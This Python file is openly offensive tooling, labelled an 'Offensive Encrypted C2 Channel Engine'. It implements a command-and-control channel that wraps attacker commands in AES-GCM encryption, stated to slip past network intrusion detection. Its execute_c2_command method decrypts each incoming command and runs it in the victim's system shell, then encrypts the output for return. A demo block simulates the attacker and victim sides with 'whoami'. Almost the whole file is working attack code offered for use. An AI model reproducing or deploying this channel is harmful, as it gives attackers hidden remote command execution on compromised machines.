import os
import json
import base64
import subprocess
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

class EncryptedC2Channel:
    """
    Offensive Cryptographic Command & Control (C2) Channel.
    Implements AES-256-GCM authenticated encryption with PBKDF2 key derivation
    to bypass Network Intrusion Detection Systems (NIDS).
    """
    def __init__(self, shared_passphrase: str):
        # 1. Salt production or fixation
        self.salt = b'C2_SECURE_SALT_2026'
        
        # 2. Deriving a Strong 256-bit Encryption Key from a Password (KDF)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,   # 32 bayt = 256 bit
            salt=self.salt,
            iterations=100_00
        )
        self.key = kdf.derive(shared_passphrase.encode('utf-8'))
        self.cipher = AESGCM(self.key)
    
    def encrypt_payload(self, plaintext_data: str) -> str:
        """
        It encrypts the incoming plaintext data using AES-GCM, generates a random Nonce/IV,
        and returns it in a packaged Base64 JSON format.
        """
        # A unique 12-byte IV (Initialization Vector) is generated for each encryption.
        nonce = os.urandom(12)
        
        # Data is encrypted (Returned output: Encrypted Data + Auth Tag)
        ciphertext = self.cipher.encrypt(nonce, plaintext_data.encode('utf-8'), associated_data=None)
        
        # Data is converted to Base64 format for secure transmission over the network.
        package = {
            "nonce": base64.b64encode(nonce).decode('utf-8'),
            "ciphertext": base64.b64encode(ciphertext).decode('utf-8')
        }
        return json.dumps(package)
    
    def decrypt_payload(self, encrypted_package_json: str) -> str:
        """
        Parses the incoming JSON packet, decodes the Base64 encoding, 
        and decrypts the data while verifying its integrity using AES-GCM.
        """
        package = json.loads(encrypted_package_json)
        nonce = base64.b64decode(package["nonce"])
        ciphertext = base64.b64decode(package["ciphertext"])
        
        # Decryption is performed and integrity (Auth Tag) is verified.
        decrypted_bytes = self.cipher.decrypt(nonce, ciphertext, associated_data=None)
        return decrypted_bytes.decode('utf-8')
    
    def execute_c2_command(self, encrypted_command_json: str) -> str:
        """
        Decrypts the encrypted command, executes it in the system (OS Shell),
        and returns the result after re-encrypting it.
        """
        # 1. Decode Command
        raw_command = self.decrypt_payload(encrypted_command_json)
        
        # 2. Execute Command on the System (OS Command Execution)
        try:
            output = subprocess.check_output(raw_command, shell=True, stderr=subprocess.STDOUT)
            command_result = output.decode('utf-8', errors='replace')
        except subprocess.CalledProcessError as e:
            command_result = f"Command Execution Failed: {e.output.decode('utf-8', errors='replace')}"
        
        # 3. Encrypt the result and send it back to the C2 center.
        return self.encrypt_payload(command_result)

if __name__ == "__main__":
    print("==================================================")
    print(" OFFENSIVE ENCRYPTED C2 CHANNEL ENGINE")
    print("==================================================\n")
    
    # Shared Secret (Attacker and client know this password)
    SECRET_PASSPHRASE = "CyberKillChain_MasterKey_2026!"
    
    # Attacker-side and victim-side channels are created.
    attacker_c2 = EncryptedC2Channel(shared_passphrase=SECRET_PASSPHRASE)
    target_agent = EncryptedC2Channel(shared_passphrase=SECRET_PASSPHRASE)
    
    # Test Command
    original_command = "whoami"
    print(f"[1] Attacker Target Command: '{original_command}'")
    
    # The command is encrypted.
    encrypted_pkg = attacker_c2.encrypt_payload(original_command)
    print(f"\n[2] Encrypted Network Package (What NIDS Sees):\n{encrypted_pkg}\n")
    
    # The command is executed on the victim system, and the response is encrypted.
    encrypted_response = target_agent.execute_c2_command(encrypted_pkg)
    print(f"[3] Encrypted Target Response Payload:\n{encrypted_response}\n")
    
    # The Attacker Decrypts the Incoming Encrypted Response
    decrypted_output = attacker_c2.decrypt_payload(encrypted_response)
    print(f"[4] Attacker Decrypted Execution Result:\n{decrypted_output}")